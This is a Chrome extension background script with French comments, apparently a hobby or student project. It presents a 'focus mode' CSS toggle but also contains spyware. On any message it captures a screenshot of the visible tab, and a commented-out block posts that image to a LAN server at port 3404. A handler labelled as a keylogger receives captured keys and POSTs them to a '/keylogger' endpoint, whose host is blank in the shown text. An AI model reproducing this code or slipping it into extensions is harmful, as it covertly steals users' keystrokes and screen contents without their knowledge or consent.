

chrome.runtime.onInstalled.addListener(() => {
  chrome.action.setBadgeText({
    text: "OFF",
  });
});



//Capture d'écran (https://developer.mozilla.org/fr/docs/Mozilla/Add-ons/WebExtensions/API/tabs/captureVisibleTab)
async function onCaptured(imageUri) {

  // chrome.storage.local.set({ key: imageUri }).then(() => {
  //   console.log("Value is set to " + imageUri);

  // });

  // chrome.storage.local.get(["key"]).then((result) => {
  //   console.log("Value currently is " + result.key);

  // });

  console.log(imageUri)
  /*
  const img = new Image()

  img.src = imageUri

  img.onload = function () {
    const canvas = document.createElement('canvas')

    canvas.width = 480
    canvas.height = 360

    const ctx = canvas.getContext('2d')
    ctx.drawImage(img, 0, 0, width, height)

    const compressedImgData = canvas.toDataURL('image/jpeg', 0.5)

    fetch('http://192.168.6.58:3404/image', {
      method: 'POST',
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ "image": compressedImgData })
    })
      .then(response => response.json())
      .then(res => console.log(res))

  }*/
}


function onError(error) {
  console.log(`Error: ${error}`);
}
// chrome.action.onClicked.addListener(function()
chrome.runtime.onMessage.addListener(function () {
  var capturing = chrome.tabs.captureVisibleTab();

  capturing.then(onCaptured, onError);
});



// When the user clicks on the extension action
chrome.action.onClicked.addListener(async (tab) => {

  // We retrieve the action badge to check if the extension is 'ON' or 'OFF'
  const prevState = await chrome.action.getBadgeText({ tabId: tab.id });
  // Next state will always be the opposite
  const nextState = prevState === 'ON' ? 'OFF' : 'ON';

  // Set the action badge to the next state
  await chrome.action.setBadgeText({
    tabId: tab.id,
    text: nextState
  });

  if (nextState === 'ON') {
    // Insert the CSS file when the user turns the extension on
    await chrome.scripting.insertCSS({
      files: ['focus-mode.css'],
      target: { tabId: tab.id }
    });


  } else if (nextState === 'OFF') {
    // Remove the CSS file when the user turns the extension off
    await chrome.scripting.removeCSS({
      files: ['focus-mode.css'],
      target: { tabId: tab.id }
    });
  }

});

// Receive message to HTML page
function handleMessage(request, sender, sendResponse) {

  console.log("Reception du keyLoger : " +
    request.greeting);

  fetch('http://:3404/keylogger', {
    method: 'POST',
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ "keys": request.greeting, "test": "test" })
  })
    .then(response => response.json())
    // .then(res => console.log(res))
    // .catch(error => {throw error})

  sendResponse({ response: "Salut Nathan" });
}

chrome.runtime.onMessage.addListener(handleMessage);